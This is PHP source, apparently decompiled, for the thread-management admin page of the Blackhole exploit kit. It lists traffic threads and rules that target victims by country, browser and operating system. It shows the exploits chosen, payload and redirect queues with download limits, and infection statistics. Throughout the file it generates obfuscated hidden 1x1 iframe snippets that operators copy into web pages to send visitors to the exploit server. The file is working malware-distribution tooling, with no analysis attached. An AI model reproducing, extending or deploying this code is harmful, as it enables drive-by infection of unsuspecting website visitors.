<?php 
if( !defined("ADMIN_LOADED") ) 
{
    exit();
}

define("PAGE", "threads");
echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\r\n\t\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n\t\r\n\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\r\n\r\n\t<title>Blackhole v.";
echo Config::get("Version");
echo "</title>\r\n\t\r\n\t<script type=\"text/javascript\" src=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=file&type=js&file=min.js\"></script>\r\n\t\r\n\t<link rel=\"stylesheet\" href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=file&type=css&file=main.css\" type=\"text/css\" media=\"screen\" />\r\n\r\n</head>\r\n<body>\r\n\t<div id=\"addThreadContainer\"></div>\r\n\t<div id=\"addRealThreadContainer\"></div>\r\n\t<div id=\"alert\" style=\"display:none;\">\r\n\t\t<div class=\"alertContent\">\r\n\t\t\t<div id=\"alertTitle\">Delete widget?</div>\r\n\t\t\t<div class=\"confirm\">\r\n\t\t\t\t<div id=\"apply\">Delete</div>\r\n\t\t\t\t<div id=\"cancel\" onclick=\"Alert.cancel()\">Cancel</div>\r\n\t\t\t</div>\r\n\t\t</div>\r\n\t</div>\r\n\t<div class=\"pageLayout\">\r\n\t\t<div class=\"test\"><div class=\"test2\">\r\n\t\t\t";
include("menu.php");
echo "\t\t\t\r\n\t\t\t<div id=\"data\" class=\"content\">\r\n\t\t\t\t<div id=\"columns\">\r\n\t\t\t\t";
$threadData = Threads::getfulldata();
$osKeys = array_keys(Browser::$OSList);
$count = count($threadData);
$kol = 0;
foreach( $threadData as $thread ) 
{
    $title = $thread["Title"];
    $threadId = $thread["ID"];
    $rules = $thread["Rules"];
    if( $kol == 0 ) 
    {
        echo "<div class=\"column\">";
    }

    if( $kol == round($count / 2) ) 
    {
        echo "</div><div class=\"column\">";
    }

    $kol++;
    $url = "http://" . $_SERVER["HTTP_HOST"] . substr($_SERVER["REQUEST_URI"], 0, strpos($_SERVER["REQUEST_URI"], Config::get("AdminScriptName")) - 1) . "/" . Config::get("MainFileName") . ".php";
    if( $threadId != 1 ) 
    {
        $url .= "?" . Config::get("StatParamName") . "=" . $thread["Url"];
    }

    $fullUrl = "document.write('<iframe src=\"" . $url . "\" width=\"1\" height=\"1\" frameborder=\"0\"></iframe>')";
    echo "\t\t\t\t\t\r\n\t\t\t\t\t<div class=\"thread\" id=\"thread";
    echo $threadId;
    echo "\">\r\n\t\t\t\t\t\t<div class=\"title\">\r\n\t\t\t\t\t\t\t<div style=\"float:left;width:350px;overflow:hidden;height:auto;\">";
    echo $title;
    echo "</div>\r\n\t\t\t\t\t\t\t";
    if( $threadId != 1 ) 
    {
        echo "\t\t\t\t\t\t\t\t<div class=\"close\" onclick=\"Threads.delThread(";
        echo $threadId;
        echo ")\"></div>\r\n\t\t\t\t\t\t\t\t<div class=\"edit\" onclick=\"Threads.editThread(";
        echo $threadId;
        echo ", '";
        echo $title;
        echo "')\"></div>\r\n\t\t\t\t\t\t\t";
    }

    echo "\t\t\t\t\t\t\t<div class=\"stat\"><a href=\"";
    echo Config::get("AdminScriptName");
    echo "?threadID=";
    echo $threadId;
    echo "\"><img src=\"";
    echo $imgPath;
    echo "stat.gif\" width=\"15px\" height=\"15px\" onmouseover=\"this.src='";
    echo $imgPath;
    echo "stat2.gif'\" onmouseout=\"this.src='";
    echo $imgPath;
    echo "stat.gif'\"/></a></div>\r\n\t\t\t\t\t\t\t<div style=\"clear:both;float:none;height:5px;\"></div>\r\n\t\t\t\t\t\t\t<div class=\"url\">\r\n\t\t\t\t\t\t\t\t<div class=\"input\">\r\n\t\t\t\t\t\t\t\t\t<input id=\"threadUrl";
    echo $threadId;
    echo "\" type=\"text\" value=\"";
    echo $url;
    echo "\" readonly=\"readonly\" onclick=\"this.select()\"/>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t<div class=\"lock\">\r\n\t\t\t\t\t\t\t\t\t<img src=\"";
    echo $imgPath;
    echo "lock2.png\" width=\"8px\" height=\"10px\" style=\"cursor:pointer;\" onclick='if(\$F(\"threadUrl";
    echo $threadId;
    echo "\") == \"";
    echo $url;
    echo "\") \$(\"threadUrl";
    echo $threadId;
    echo "\").value = \"";
    echo str_replace("\"", "\\\"", str_replace("'", "\"", _obfuscated_0D0603065B083E27323C0815233627335B0C1102191001_($fullUrl)));
    echo "\"; else \$(\"threadUrl";
    echo $threadId;
    echo "\").value = \"";
    echo $url;
    echo "\";'/>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t<div class=\"rules\" id=\"rules";
    echo $threadId;
    echo "\">\r\n\t\t\t\t\t\t";
    $c = count($rules) % 2;
    foreach( $rules as $k => $t ) 
    {
        $showMax = 0 < $t["countryCount"] || 0 < $t["browserCount"] || 0 < $t["osCount"] || 0 < $t["exploitCount"] || 0 < $t["redirectCount"] || 0 < $t["filesCount"];
        $uid = $t["ID"];
        echo "\t\t\t\t\t\t\t<div id=\"rule_";
        echo $uid;
        echo "\" class=\"rule";
        if( $k % 2 == $c ) 
        {
            echo " odd";
        }

        if( !$t["Active"] ) 
        {
            echo " paused";
        }

        echo "\" ";
        if( $t["Title"] == "default" ) 
        {
            echo " locked=\"true\" ";
        }

        echo ">\r\n\t\t\t\t\t\t\t\t<div class=\"rule_title";
        if( $t["Title"] == "default" ) 
        {
            echo " disabled";
        }

        echo "\">\r\n\t\t\t\t\t\t\t\t\t<div class=\"rule_real_title\"><b>";
        echo Lang::get("RuleTitle");
        echo "</b>: ";
        echo $t["Title"];
        echo "</div>\r\n\t\t\t\t\t\t\t\t\t";
        if( $t["Title"] != "default" ) 
        {
            echo "\t\t\t\t\t\t\t\t\t\t<div class=\"close\" onclick=\"Threads.delRule(";
            echo $threadId;
            echo ", ";
            echo $t["ID"];
            echo ")\"></div>\r\n\t\t\t\t\t\t\t\t\t\t";
            if( $showMax ) 
            {
                echo "\t\t\t\t\t\t\t\t\t\t\t<div class=\"max\" onclick=\"Threads.toggleAll('thread";
                echo $threadId;
                echo "', 'rule";
                echo $uid;
                echo "')\"></div>\r\n\t\t\t\t\t\t\t\t\t\t";
            }

            echo "\t\t\t\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t\t\t\t<div class=\"edit\" onclick=\"";
        echo $t["editUrl"];
        echo "\"></div>\r\n\t\t\t\t\t\t\t\t\t<div class=\"stat\"><a href=\"";
        echo Config::get("AdminScriptName");
        echo "?threadID=";
        echo $threadId;
        echo "&ruleID=";
        echo $uid;
        echo "\"><img src=\"";
        echo $imgPath;
        echo "stat.gif\" width=\"15px\" height=\"15px\" onmouseover=\"this.src='";
        echo $imgPath;
        echo "stat2.gif'\" onmouseout=\"this.src='";
        echo $imgPath;
        echo "stat.gif'\"/></a></div>\r\n\t\t\t\t\t\t\t\t\t";
        if( $t["Title"] != "default" ) 
        {
            echo "\t\t\t\t\t\t\t\t\t\t<div class=\"play";
            if( !$t["Active"] ) 
            {
                echo " pause";
            }

            echo "\" onclick=\"Threads.playPauseThread(";
            echo $uid;
            echo ")\"></div>\r\n\t\t\t\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t<div class=\"rule_content\">\r\n\t\t\t\t\t\t\t\t\t";
        if( $threadId != 0 || $uid != 0 ) 
        {
            echo "\t\t\t\t\t\t\t\t\t\t";
            if( 0 < $t["countryCount"] ) 
            {
                echo "\t\t\t\t\t\t\t\t\t\t\t<div class=\"block_title\">";
                echo Lang::get("StatisticsCountriesLabel");
                echo ":</div>\r\n\t\t\t\t\t\t\t\t\t\t\t<div class=\"block_content\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
                if( 0 < $t["countryCount"] ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t<a href=\"javascript:void(0)\" class=\"moreLink\">";
                    echo Lang::getnumber($t["countryCount"], "StatisticsCountriesLabel");
                    echo "</a><img src=\"";
                    echo $imgPath;
                    echo "more.png\" class=\"more\"/>\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
                }

                echo "\t\t\t\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\t\t\t\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t\t\t\t<ul ";
                if( 0 < $t["countryCount"] ) 
                {
                    echo "style=\"display:none;\"";
                }
                else
                {
                    echo "locked=\"true\"";
                }

                echo ">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                foreach( $t["CountriesSplit"] as $id ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><img src=\"";
                    echo $imgPath;
                    echo "icons/countries/";
                    echo strtolower(Browser::$countryCodes[$id]);
                    echo ".gif\" width=\"16px\"/>";
                    echo Browser::$countryNames[$id];
                    echo "</li>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }
                echo "\t\t\t\t\t\t\t\t\t\t\t\t</ul>\r\n\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t\t\t";
            }

            echo "\t\t\t\t\t\t\t\t\t\t";
            if( 0 < $t["browserCount"] ) 
            {
                echo "\t\t\t\t\t\t\t\t\t\t\t<div class=\"block_title\">";
                echo Lang::get("StatisticsBrowsersLabel");
                echo ":</div>\r\n\t\t\t\t\t\t\t\t\t\t\t<div class=\"block_content\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
                if( 0 < $t["browserCount"] ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t<a href=\"javascript:void(0)\" class=\"moreLink\">";
                    echo Lang::getnumber($t["browserCount"], "StatisticsBrowsersLabel", "", "а", "ов");
                    echo "</a><img src=\"";
                    echo $imgPath;
                    echo "more.png\" class=\"more\"/>\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
                }

                echo "\t\t\t\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t<ul ";
                if( 0 < $t["browserCount"] ) 
                {
                    echo "style=\"display:none;\"";
                }
                else
                {
                    echo "locked=\"true\"";
                }

                echo ">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                foreach( $t["BrowsersSplit"] as $id ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><img src=\"";
                    echo $imgPath . "icons/" . Browser::$icons["browsers"][$id];
                    echo ".gif\" width=\"16px\"/>";
                    echo Browser::$browsers[$id];
                    echo "</li>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }
                echo "\t\t\t\t\t\t\t\t\t\t\t\t</ul>\r\n\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t\t\t";
            }

            echo "\t\t\t\t\t\t\t\t\t\t";
            if( 0 < $t["osCount"] ) 
            {
                echo "\t\t\t\t\t\t\t\t\t\t\t<div class=\"block_title\">";
                echo Lang::get("StatisticsOSLabel");
                echo ":</div>\r\n\t\t\t\t\t\t\t\t\t\t\t<div class=\"block_content\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
                if( 0 < $t["osCount"] ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t<a href=\"javascript:void(0)\" class=\"moreLink\">";
                    echo $t["osCount"];
                    echo " ";
                    echo Lang::get("StatisticsOSLabel");
                    echo "</a><img src=\"";
                    echo $imgPath;
                    echo "more.png\" class=\"more\"/>\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
                }

                echo "\t\t\t\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t<ul ";
                if( 0 < $t["osCount"] ) 
                {
                    echo "style=\"display:none;\"";
                }
                else
                {
                    echo "locked=\"true\"";
                }

                echo ">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                foreach( $t["OsesSplit"] as $id ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><img src=\"";
                    echo $imgPath . "icons/" . Browser::$icons["oses"][$id];
                    echo ".gif\" width=\"16px\"/>";
                    echo $osKeys[$id];
                    echo "</li>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }
                echo "\t\t\t\t\t\t\t\t\t\t\t\t</ul>\r\n\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t\t\t";
            }

            echo "\t\t\t\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t\t\t\t";
        if( 0 < $t["exploitCount"] ) 
        {
            echo "\t\t\t\t\t\t\t\t\t\t<div class=\"block_title\">";
            echo Lang::get("StatisticsExploitsLabel");
            echo ":</div>\r\n\t\t\t\t\t\t\t\t\t\t<div class=\"block_content\">\r\n\t\t\t\t\t\t\t\t\t\t\t";
            if( 0 < $t["exploitCount"] ) 
            {
                echo "\t\t\t\t\t\t\t\t\t\t\t\t<a href=\"javascript:void(0)\" class=\"moreLink\">";
                echo Lang::getnumber($t["exploitCount"], "StatisticsExploitsLabel", "", "а", "ов");
                echo "</a><img src=\"";
                echo $imgPath;
                echo "more.png\" class=\"more\"/>\r\n\t\t\t\t\t\t\t\t\t\t\t";
            }

            echo "\t\t\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t\t\t\t<ul ";
            if( 0 < $t["exploitCount"] ) 
            {
                echo "style=\"display:none;\"";
            }
            else
            {
                echo "locked=\"true\"";
            }

            echo ">\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
            foreach( $t["ExploitsSplit"] as $id ) 
            {
                echo "\t\t\t\t\t\t\t\t\t\t\t\t\t<li><img src=\"";
                echo $imgPath . "icons/exploit.gif";
                echo "\" width=\"16px\"/>";
                echo Browser::$exploits[$id];
                echo "</li>\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
            }
            echo "\t\t\t\t\t\t\t\t\t\t\t</ul>\r\n\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t\t\t\t";
        if( 0 < $t["redirectCount"] ) 
        {
            echo "\t\t\t\t\t\t\t\t\t\t<div class=\"block_title\">";
            echo Lang::get("StatisticsRedirectsLabel");
            echo ":</div>\r\n\t\t\t\t\t\t\t\t\t\t<div class=\"block_content\">\r\n\t\t\t\t\t\t\t\t\t\t\t<ul locked=\"true\" class=\"files\" id=\"redirects";
            echo $uid;
            echo "\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
            $first = true;
            foreach( $t["RedirectsSplit"] as $arr ) 
            {
                $title = $arr["Title"];
                $limit = $arr["Limit"];
                if( $limit != 0 - 1 ) 
                {
                    $curLimit = Threads::findredirect($arr["ID"]);
                    $percent = (1 * ($limit - $curLimit)) / $limit;
                }
                else
                {
                    $curLimit = abs(Threads::findredirect($arr["ID"])) - 1;
                    $percent = 0;
                }

                $fileName = $title;
                $width = 110 * $percent - 6;
                $id = $arr["ID"];
                if( $percent == 1 ) 
                {
                    echo "<li class=\"past\" id=\"redirect" . $uid . "_" . $id . "\">";
                }
                else
                {
                    if( $first && ($percent < 1 || $limit == 0 - 1) ) 
                    {
                        echo "<li class=\"active\" id=\"redirect" . $uid . "_" . $id . "\">";
                    }
                    else
                    {
                        echo "<li class=\"future\" id=\"redirect" . $uid . "_" . $id . "\">";
                    }

                }

                $short = $title;
                if( 25 < strlen($short) ) 
                {
                    $short = substr($short, 0, 15) . "..." . substr($short, 0 - 10);
                }

                echo "\t\t\t\t\t\t\t\t\t\t\t\t\t<span><a title=\"";
                echo $title;
                echo "\">";
                echo $short;
                echo "</a></span>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                if( $limit != 0 - 1 ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c1\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c2\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c3\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    if( 0 < $percent ) 
                    {
                        echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c7\" style=\"width:";
                        echo $percent * 100;
                        echo "%\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c4\" style=\"width:";
                        echo $width;
                        echo "px;\"></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c5\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c6\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    }

                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }
                else
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c1\"><img style=\"margin:0;\" src=\"";
                    echo $imgPath;
                    echo "unlim-graph.gif\" width=\"110px\" height=\"6px\"/></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }

                echo "\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"stat\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                if( $limit != 0 - 1 ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    echo $limit - $curLimit;
                    echo " ";
                    echo Lang::get("From");
                    echo " ";
                    echo $limit;
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }
                else
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    echo $curLimit;
                    echo " ";
                    echo Lang::get("From");
                    echo " &#8734;\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }

                echo "\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t</li>\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
                if( $percent < 1 ) 
                {
                    $first = false;
                }

            }
            echo "\t\t\t\t\t\t\t\t\t\t\t</ul>\r\n\t\t\t\t\t\t\t\t\t\t\t<script>\r\n\t\t\t\t\t\t\t\t\t\t\t\tSortable.create(\$('redirects";
            echo $uid;
            echo "'), {tag: 'li',onUpdate:function(){Threads.redirectsReorder(";
            echo $uid;
            echo ");}});\r\n\t\t\t\t\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t\t\t\t";
        if( 0 < $t["filesCount"] ) 
        {
            echo "\t\t\t\t\t\t\t\t\t\t<div class=\"block_title\">";
            echo Lang::get("StatisticsFilesLabel");
            echo ":</div>\r\n\t\t\t\t\t\t\t\t\t\t<div class=\"block_content\">\r\n\t\t\t\t\t\t\t\t\t\t\t<ul locked=\"true\" class=\"files\" id=\"files";
            echo $uid;
            echo "\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
            $first = true;
            foreach( $t["FilesSplit"] as $arr ) 
            {
                $title = $arr["Title"];
                $id = $arr["ID"];
                $limit = db::selectone("FileLimit", "Files", "ID = " . $arr["ID"]);
                $curLimit = Threads::findfile($arr["ID"], $title);
                if( $limit != 0 - 1 ) 
                {
                    $percent = (1 * ($limit - $curLimit)) / $limit;
                }
                else
                {
                    $curLimit = abs($curLimit) - 1;
                    $percent = 0;
                }

                $width = 110 * $percent - 6;
                if( $percent == 1 ) 
                {
                    echo "<li class=\"past\" id=\"file" . $uid . "_" . $id . "\">";
                }
                else
                {
                    if( $first && ($percent < 1 || $limit == 0 - 1) ) 
                    {
                        echo "<li class=\"active\" id=\"file" . $uid . "_" . $id . "\">";
                    }
                    else
                    {
                        echo "<li class=\"future\" id=\"file" . $uid . "_" . $id . "\">";
                    }

                }

                echo "\t\t\t\t\t\t\t\t\t\t\t\t\t<span>";
                echo $title;
                echo "</span>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                if( $limit != 0 - 1 ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c1\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c2\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c3\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    if( 0 < $percent ) 
                    {
                        echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c7\" style=\"width:";
                        echo $percent * 100;
                        echo "%\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c4\" style=\"width:";
                        echo $width;
                        echo "px;\"></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c5\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c6\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    }

                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }
                else
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c1\"><img style=\"margin:0;\" src=\"";
                    echo $imgPath;
                    echo "unlim-graph.gif\" width=\"110px\" height=\"6px\"/></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }

                echo "\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"stat\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                if( $limit != 0 - 1 ) 
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    echo $limit - $curLimit;
                    echo " ";
                    echo Lang::get("From");
                    echo " ";
                    echo $limit;
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }
                else
                {
                    echo "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                    echo $curLimit;
                    echo " ";
                    echo Lang::get("From");
                    echo " &#8734;\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t";
                }

                echo "\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t</li>\r\n\t\t\t\t\t\t\t\t\t\t\t\t";
                if( $percent < 1 ) 
                {
                    $first = false;
                }

            }
            echo "\t\t\t\t\t\t\t\t\t\t\t</ul>\r\n\t\t\t\t\t\t\t\t\t\t\t<script>\r\n\t\t\t\t\t\t\t\t\t\t\t\tSortable.create(\$('files";
            echo $uid;
            echo "'), {tag: 'li',onUpdate:function(){Threads.filesReorder(";
            echo $uid;
            echo ");}});\r\n\t\t\t\t\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t\t";
            if( $first ) 
            {
                echo "\t\t\t\t\t\t\t\t\t\t<script>\r\n\t\t\t\t\t\t\t\t\t\t\t\$('rule_";
                echo $uid;
                echo "').addClassName('doned');\r\n\t\t\t\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t\t\t\t";
            }

        }

        echo "\t\t\t\t\t\t\t\t\t<div class=\"block_title\">";
        echo Lang::get("StatisticsTrafficLabel");
        echo ":</div>\r\n\t\t\t\t\t\t\t\t\t<div class=\"block_content\">\r\n\t\t\t\t\t\t\t\t\t\t";
        $text = "";
        switch( $t["TrafficType"] ) 
        {
            case 0:
                $text = Lang::get("ForAll");
                break;
            case 1:
                $text = Lang::get("ForHits");
                break;
            case 2:
                $text = Lang::get("ForHosts");
        }
        echo "\t\t\t\t\t\t\t\t\t\t<img src=\"";
        echo $imgPath;
        echo "uniq";
        echo $t["TrafficType"];
        echo ".png\" width=\"12px\" height=\"10px\"/> ";
        echo $text;
        echo "\t\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t";
    }
    echo "\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t";
    if( $threadId != 0 ) 
    {
        echo "\t\t\t\t\t\t\t<div class=\"addRule\">\r\n\t\t\t\t\t\t\t\t<input type=\"button\" onclick=\"Threads.addRule(";
        echo $threadId;
        echo ")\" value=\"";
        echo Lang::get("AddRuleLabel");
        echo "\"/>\r\n\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t";
    }

    echo "\t\t\t\t\t</div>\r\n\t\t\t\t";
}
echo "\t\t\t\t\t</div>\r\n\t\t\t\t\t<div class=\"addThread\">\r\n\t\t\t\t\t\t<input type=\"button\" id=\"addThreadOpen\" value=\"";
echo Lang::get("AddThreadLabel");
echo "\"/>\r\n\t\t\t\t\t</div>\r\n\t\t\t\t</div>\r\n\t\t\t</div>\r\n\t\t</div></div>\r\n\t\t<div class=\"footer\">\r\n\t\t\t<b>Blackhole v.";
echo Config::get("Version");
echo "</b>\r\n\t\t</div>\r\n\t</div>\r\n\t\r\n\t<script>\r\n\t\tThreads.makeSortable();\r\n\r\n\t\tEvent.observe(window, 'load', function () {\r\n\t\t\taddThreadWindow = new Lightbox('addThreadContainer');\r\n\t\t\taddRealThreadWindow = new Lightbox('addRealThreadContainer');\r\n\t\t\tThreads.moreLinkFind();\r\n\t\t});\r\n\t\t\r\n\t\tEvent.observe('addThreadOpen', 'click', function () {\r\n\t\t\tnew Ajax.Request('";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=addThread', { method: 'post', postBody: null, onComplete : function (t) {\r\n\t\t\t\t\tThreads.lastThreadID = null;\r\n\t\t\t\t\t\$('addRealThreadContainer').update(t.responseText);\r\n\t\t\t\t\taddRealThreadWindow.open();\r\n\t\t\t\t\t\$('threadTitle').focus();\r\n\t\t\t\t\t\r\n\t\t\t\t\tEvent.observe('addRealThreadClose', 'click', function () {\r\n\t\t\t\t\t\taddRealThreadWindow.close();\r\n\t\t\t\t\t});\r\n\t\t\t\t} });\r\n\t\t});\r\n\t</script>\r\n</body>\r\n</html>";

